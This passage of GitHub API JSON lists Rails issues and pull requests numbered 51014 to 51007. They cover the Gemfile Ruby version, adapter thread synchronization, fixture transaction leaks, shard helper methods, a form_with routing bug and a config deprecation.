        "comments_url": "https://api.github.com/repos/rails/rails/issues/51014/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51014/events",
        "html_url": "https://github.com/rails/rails/issues/51014",
        "id": 2125535086,
        "node_id": "I_kwDNIULOfrEXbg",
        "number": 51014,
        "title": "Read the Ruby Version in Gemfile Instead of Hardcoding the Version",
        "user": {
            "login": "bparanj",
            "id": 12740,
            "node_id": "MDQ6VXNlcjEyNzQw",
            "avatar_url": "https://avatars.githubusercontent.com/u/12740?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/bparanj",
            "html_url": "https://github.com/bparanj",
            "followers_url": "https://api.github.com/users/bparanj/followers",
            "following_url": "https://api.github.com/users/bparanj/following{/other_user}",
            "gists_url": "https://api.github.com/users/bparanj/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/bparanj/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/bparanj/subscriptions",
            "organizations_url": "https://api.github.com/users/bparanj/orgs",
            "repos_url": "https://api.github.com/users/bparanj/repos",
            "events_url": "https://api.github.com/users/bparanj/events{/privacy}",
            "received_events_url": "https://api.github.com/users/bparanj/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 41328116,
                "node_id": "MDU6TGFiZWw0MTMyODExNg==",
                "url": "https://api.github.com/repos/rails/rails/labels/attached%20PR",
                "name": "attached PR",
                "color": "006b75",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-08T16:01:18Z",
        "updated_at": "2024-02-09T15:15:30Z",
        "closed_at": "2024-02-09T15:15:30Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nCreate a new rails project. The generated Gemfile has:\r\n\r\n```ruby\r\nruby \"3.3.0\"\r\n```\r\n\r\nEnhancement:\r\n\r\nUse the file argument of rubygems:\r\n\r\n```ruby\r\nruby file: \".ruby-version\"\r\n```\r\n\r\n### Expected behavior\r\n\r\nThe Ruby version must be specified only once. Currently it is specified in multiple locations which is not ideal.\r\n\r\n### Actual behavior\r\n\r\nRuby version is hard coded in Gemfile when the Rails project is generated.\r\n\r\n### System configuration\r\n**Rails version**:\r\n7.1.2\r\n**Ruby version**:\r\n3.3.0\r\n\r\n[More details here](https://andycroll.com/ruby/read-ruby-version-in-your-gemfile/)",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51014/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51014/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51013",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51013/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51013/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51013/events",
        "html_url": "https://github.com/rails/rails/pull/51013",
        "id": 2125439777,
        "node_id": "PR_kwDNIULOZmQB6w",
        "number": 51013,
        "title": "Use `file` option to determine Ruby version in Gemfile",
        "user": {
            "login": "Uaitt",
            "id": 97030518,
            "node_id": "U_kgDOBciRdg",
            "avatar_url": "https://avatars.githubusercontent.com/u/97030518?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Uaitt",
            "html_url": "https://github.com/Uaitt",
            "followers_url": "https://api.github.com/users/Uaitt/followers",
            "following_url": "https://api.github.com/users/Uaitt/following{/other_user}",
            "gists_url": "https://api.github.com/users/Uaitt/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Uaitt/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Uaitt/subscriptions",
            "organizations_url": "https://api.github.com/users/Uaitt/orgs",
            "repos_url": "https://api.github.com/users/Uaitt/repos",
            "events_url": "https://api.github.com/users/Uaitt/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Uaitt/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-08T15:22:49Z",
        "updated_at": "2024-02-08T15:55:12Z",
        "closed_at": "2024-02-08T15:55:12Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51013",
            "html_url": "https://github.com/rails/rails/pull/51013",
            "diff_url": "https://github.com/rails/rails/pull/51013.diff",
            "patch_url": "https://github.com/rails/rails/pull/51013.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\nAt the moment, a fresh new Rails app will define the current Ruby version in 2 different places:\r\n- the `.ruby-version` file\r\n- the top of the `Gemfile`, with the `ruby` method call\r\n\r\nThis duplication can be a problem when, for example, bumping Ruby to an higher version (someone might forget to change the number in one place). Here's an [issue](https://github.com/rubygems/rubygems/issues/6742) from Bundler where this concept is explained more deeply.\r\n\r\nIn order to solve this, [Bundler 2.4.19](https://github.com/rubygems/rubygems/blob/master/bundler/CHANGELOG.md#2419-august-17-2023) adds the possibilty of specifying the Ruby version in the `Gemfile` by directly pointing to a file containing that version. This is the [PR](https://github.com/rubygems/rubygems/pull/6876) that introduced such enhancement. \r\n\r\n### Detail\r\n\r\nWith that being said, having something like this in the `Gemfile` of a new Rails app:\r\n```rb\r\nruby file: \".ruby-version\"\r\n````\r\navoids duplication and can make life easier when upgrading Ruby.\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51013/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51013/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51012",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51012/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51012/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51012/events",
        "html_url": "https://github.com/rails/rails/pull/51012",
        "id": 2125228534,
        "node_id": "PR_kwDNIULOZmEVqA",
        "number": 51012,
        "title": "Properly synchronize `Mysql2Adapter#active?` and `TrilogyAdapter#active?`",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-02-08T13:47:02Z",
        "updated_at": "2024-02-09T16:47:59Z",
        "closed_at": "2024-02-08T14:10:16Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51012",
            "html_url": "https://github.com/rails/rails/pull/51012",
            "diff_url": "https://github.com/rails/rails/pull/51012.diff",
            "patch_url": "https://github.com/rails/rails/pull/51012.patch",
            "merged_at": "2024-02-08T14:10:16Z"
        },
        "body": "As well as `disconnect!` and `verify!`.\r\n\r\nThis generally isn't a big problem as connections must not be shared between threads, but is required when running transactional tests or system tests and could lead to a SEGV.\r\n\r\nFound while working on https://github.com/rails/rails/pull/50999",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51012/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51012/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51011",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51011/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51011/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51011/events",
        "html_url": "https://github.com/rails/rails/pull/51011",
        "id": 2124983535,
        "node_id": "PR_kwDNIULOZl20Bw",
        "number": 51011,
        "title": "Revert \"Pin minitest version to 5.21\"",
        "user": {
            "login": "zzak",
            "id": 277819,
            "node_id": "MDQ6VXNlcjI3NzgxOQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/277819?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/zzak",
            "html_url": "https://github.com/zzak",
            "followers_url": "https://api.github.com/users/zzak/followers",
            "following_url": "https://api.github.com/users/zzak/following{/other_user}",
            "gists_url": "https://api.github.com/users/zzak/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/zzak/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/zzak/subscriptions",
            "organizations_url": "https://api.github.com/users/zzak/orgs",
            "repos_url": "https://api.github.com/users/zzak/repos",
            "events_url": "https://api.github.com/users/zzak/events{/privacy}",
            "received_events_url": "https://api.github.com/users/zzak/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-08T11:41:43Z",
        "updated_at": "2024-02-08T12:02:42Z",
        "closed_at": null,
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51011",
            "html_url": "https://github.com/rails/rails/pull/51011",
            "diff_url": "https://github.com/rails/rails/pull/51011.diff",
            "patch_url": "https://github.com/rails/rails/pull/51011.patch",
            "merged_at": null
        },
        "body": "Reverts rails/rails#50978\r\n\r\n5.22.2 was released to address this, hopefully. :pray:",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51011/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51011/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51010",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51010/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51010/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51010/events",
        "html_url": "https://github.com/rails/rails/pull/51010",
        "id": 2124749161,
        "node_id": "PR_kwDNIULOZlpvFw",
        "number": 51010,
        "title": "Gracefully handle transactional fixtures leaks",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-08T09:51:31Z",
        "updated_at": "2024-02-11T20:54:25Z",
        "closed_at": "2024-02-08T10:43:25Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51010",
            "html_url": "https://github.com/rails/rails/pull/51010",
            "diff_url": "https://github.com/rails/rails/pull/51010.diff",
            "patch_url": "https://github.com/rails/rails/pull/51010.patch",
            "merged_at": "2024-02-08T10:43:25Z"
        },
        "body": "Extracted from: https://github.com/rails/rails/pull/50999\r\n\r\nSome tests may use the connections in ways that cause the fixtures transaction to be committed or rolled back. The typical case being doing schema change query in MySQL, which automatically commits the transaction. But ther eare more subtle cases.\r\n\r\nThe general idea here is to ensure our transaction is correctly rolling back during teardown. If it fails, then we assume something might have mutated some of the inserted fixtures, so we invalidate the cache to ensure the next test will reset them.\r\n\r\nThis issue is particularly common in Active Record's own test suite since transaction fixtures are enabled by default but we have many tests create tables and such.\r\n\r\nWe could treat this case as an error, but since we can gracefully recover from it, I don't think it's worth it.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51010/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51010/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51009",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51009/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51009/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51009/events",
        "html_url": "https://github.com/rails/rails/pull/51009",
        "id": 2124643621,
        "node_id": "PR_kwDNIULOZlj9qQ",
        "number": 51009,
        "title": "Add `.shard_keys`, `.sharded?`, & `.on_all_shards` methods to AR Models",
        "user": {
            "login": "HeyNonster",
            "id": 47484308,
            "node_id": "MDQ6VXNlcjQ3NDg0MzA4",
            "avatar_url": "https://avatars.githubusercontent.com/u/47484308?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/HeyNonster",
            "html_url": "https://github.com/HeyNonster",
            "followers_url": "https://api.github.com/users/HeyNonster/followers",
            "following_url": "https://api.github.com/users/HeyNonster/following{/other_user}",
            "gists_url": "https://api.github.com/users/HeyNonster/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/HeyNonster/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/HeyNonster/subscriptions",
            "organizations_url": "https://api.github.com/users/HeyNonster/orgs",
            "repos_url": "https://api.github.com/users/HeyNonster/repos",
            "events_url": "https://api.github.com/users/HeyNonster/events{/privacy}",
            "received_events_url": "https://api.github.com/users/HeyNonster/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-08T08:50:30Z",
        "updated_at": "2024-02-14T16:02:46Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51009",
            "html_url": "https://github.com/rails/rails/pull/51009",
            "diff_url": "https://github.com/rails/rails/pull/51009.diff",
            "patch_url": "https://github.com/rails/rails/pull/51009.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nCurrently, there is no (simple) way to ask a model if it connects to a single database or to multiple shards. Furthermore, without looping through a model's connections, I don't believe there's an easy way to return a list of shards a model can connect to.\r\n\r\n### Detail\r\n\r\nThis commit adds a `@shard_keys` ivar that's set whenever `.connects_to` is called. It sets the ivar to the result of `shards.keys`. `shards` in `.connects_to` defaults to an empty hash and therefore when calling `connects_to database: {...}` `@shard_keys` will be set to an empty array.\r\n\r\n`@shard_keys` is set _before_ the following lines:\r\n\r\n```ruby\r\nif shards.empty?\r\n  shards[:default] = database\r\nend\r\n```\r\n\r\nThis conditional sets the one and only shard (`:default`) to the value of `database` that we pass to `.connects_to`. This allows for calling `connected_to(shard: :default)` on models configured to only connect to a database e.g.:\r\n\r\n```ruby\r\nclass UnshardedBase < ActiveRecord::Base\r\n  self.abstract_class = true\r\n\r\n  connects_to database: { writing: :primary }\r\nend\r\n\r\nclass UnshardedModel < UnshardedBase\r\nend\r\n\r\nUnshardedBase.connected_to(shard: :default) { UnshardedBase.connection_pool.db_config.name } => primary\r\n```\r\n\r\nThis is ultimately still an _unsharded_ model which is why `@shard_keys` gets set before the conditional.\r\n\r\nWith the new `@shard_keys` ivar we need a way for descendants of the abstract AR model to return that same value. For that we leverage the existing `.connection_class_for_self` method. That method returns the ancestor of the model where `.connects_to` was called, or returns self if it's the connection class:\r\n\r\n```ruby\r\nclass UnshardedBase < ActiveRecord::Base\r\n  self.abstract_class = true\r\n\r\n  connects_to database: { writing: :primary }\r\nend\r\n\r\nclass UnshardedModel < UnshardedBase\r\nend\r\n\r\nActiveRecord::Base.connection_class_for_self => ActiveRecord::Base\r\n\r\nUnshardedBase.connection_class_for_self => UnshardedBase(abstract)\r\n\r\nUnshardedModel.connection_class_for_self => UnshardedBase(abstract)\r\n```\r\n\r\nThe new `.shard_keys` method is a getter which returns the value of `@shard_keys` from the connection class or it returns an empty array. The empty array is necessary in cases where `connects_to` was never called.\r\n\r\nFinally, I've added an `.on_all_shards` method which takes all of the arguments for `.connected_to` except for `shard`. Instead, it loops through every shard key and then delegates everything else to `.connected_to`. I've used `.map` instead of `.each` so that we can collect the results of each block.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51009/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51009/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51008",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51008/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51008/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51008/events",
        "html_url": "https://github.com/rails/rails/issues/51008",
        "id": 2124460611,
        "node_id": "I_kwDNIULOfqCyQw",
        "number": 51008,
        "title": "Passing an array to the `model` parameter of `form_with` does not work with singular, unpersisted resources",
        "user": {
            "login": "johnpitchko",
            "id": 7190681,
            "node_id": "MDQ6VXNlcjcxOTA2ODE=",
            "avatar_url": "https://avatars.githubusercontent.com/u/7190681?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/johnpitchko",
            "html_url": "https://github.com/johnpitchko",
            "followers_url": "https://api.github.com/users/johnpitchko/followers",
            "following_url": "https://api.github.com/users/johnpitchko/following{/other_user}",
            "gists_url": "https://api.github.com/users/johnpitchko/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/johnpitchko/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/johnpitchko/subscriptions",
            "organizations_url": "https://api.github.com/users/johnpitchko/orgs",
            "repos_url": "https://api.github.com/users/johnpitchko/repos",
            "events_url": "https://api.github.com/users/johnpitchko/events{/privacy}",
            "received_events_url": "https://api.github.com/users/johnpitchko/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-08T06:41:27Z",
        "updated_at": "2024-02-12T19:45:58Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nPassing an array to the `model` parameter of `form_with` when the terminal resource in the array is singular _AND_ unpersisted generates an incorrect path. In the example below, ActionDispatch generates a named path of `posts_comments_path`, which does not exist because the routes defines a singular `comment` resource, so the valid path should be `posts_comments_path`.\r\n\r\nIn my testing, this issue only appears of the resource is unpersisted; so works fine if the form is updating a saved resource but not when creating a new resource. My own _highly_ inexperienced analysis discovered that the `PolymorphicRoutes` class will [return a singular resource path _if_ the resource is persisted](https://github.com/rails/rails/blob/36c1591bcb5e0ee3084759c7f42a706fe5bb7ca7/actionpack/lib/action_dispatch/routing/polymorphic_routes.rb#L317). If the resource is new, then the code runs [this line to generate a plural path](https://github.com/rails/rails/blob/36c1591bcb5e0ee3084759c7f42a706fe5bb7ca7/actionpack/lib/action_dispatch/routing/polymorphic_routes.rb#L321).\r\n\r\nI understand that this _might_ be an intentional design or may be justified for some reason beyond my understanding. Also, I appreciate that it may not be possible for ActionDispatch to be aware if the resource is singular or plural.\r\n\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\"\r\n  # If you want to test against edge Rails replace the previous line with this:\r\n  # gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\n  gem 'sqlite3'\r\n  gem 'debug'\r\nend\r\n\r\n# require \"action_controller/railtie\"\r\nrequire \"active_record\"\r\nrequire \"action_view\"\r\n\r\n# This connection will do for database-independent bug reports.\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :posts, force: true do |t|\r\n  end\r\n\r\n  create_table :comments, force: true do |t|\r\n    t.integer :post_id\r\n  end\r\nend\r\n\r\nclass Post < ActiveRecord::Base\r\n  has_one :comment\r\nend\r\n\r\nclass Comment < ActiveRecord::Base\r\n  belongs_to :post\r\nend\r\n\r\nclass TestApp < Rails::Application\r\n  config.root = __dir__\r\n  config.hosts << \"example.org\"\r\n  config.secret_key_base = \"secret_key_base\"\r\n\r\n  config.logger = Logger.new($stdout)\r\n  Rails.logger  = config.logger\r\n\r\n  routes.draw do\r\n    get \"/\" => \"test#index\"\r\n\r\n    resources :posts do\r\n      resource :comment\r\n    end\r\n  end\r\nend\r\n\r\nrequire \"minitest/autorun\"\r\nrequire \"rack/test\"\r\n\r\nclass BugTest < ActionView::TestCase\r\n  include ActionView::Helpers::FormHelper\r\n  include Rails.application.routes.url_helpers\r\n\r\n  def test_something\r\n    post = Post.create\r\n\r\n    result = form_with model: [post, Comment.new] \r\n    assert result.match %r{\"\\/posts\\/1\\/comment\"}\r\n  end\r\n\r\n  private\r\n\r\n  def app\r\n    Rails.application\r\n  end\r\nend\r\n\r\n```\r\n\r\n### Expected behavior\r\nActionDispatch should return the correct path using a singular child resource `/posts/1/comment`\r\n\r\n### Actual behavior\r\nActionDispatch returns the incorrect path using a plural child resource `/posts/1/comments`\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3\r\n\r\n**Ruby version**: 3.0.2\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51008/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51008/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51007",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51007/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51007/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51007/events",
        "html_url": "https://github.com/rails/rails/pull/51007",
        "id": 2124392817,
        "node_id": "PR_kwDNIULOZlWm9g",
        "number": 51007,
        "title": "Deprecate config.active_record.warn_on_records_fetched_greater_than",
        "user": {
            "login": "hundredwatt",
            "id": 91577,
            "node_id": "MDQ6VXNlcjkxNTc3",
            "avatar_url": "https://avatars.githubusercontent.com/u/91577?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/hundredwatt",
            "html_url": "https://github.com/hundredwatt",
            "followers_url": "https://api.github.com/users/hundredwatt/followers",
            "following_url": "https://api.github.com/users/hundredwatt/following{/other_user}",
            "gists_url": "https://api.github.com/users/hundredwatt/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/hundredwatt/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/hundredwatt/subscriptions",
            "organizations_url": "https://api.github.com/users/hundredwatt/orgs",
            "repos_url": "https://api.github.com/users/hundredwatt/repos",
            "events_url": "https://api.github.com/users/hundredwatt/events{/privacy}",
            "received_events_url": "https://api.github.com/users/hundredwatt/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-08T05:34:25Z",
        "updated_at": "2024-02-15T14:50:15Z",
        "closed_at": "2024-02-13T23:20:55Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51007",
            "html_url": "https://github.com/rails/rails/pull/51007",
            "diff_url": "https://github.com/rails/rails/pull/51007.diff",
            "patch_url": "https://github.com/rails/rails/pull/51007.patch",
            "merged_at": "2024-02-13T23:20:55Z"
        },
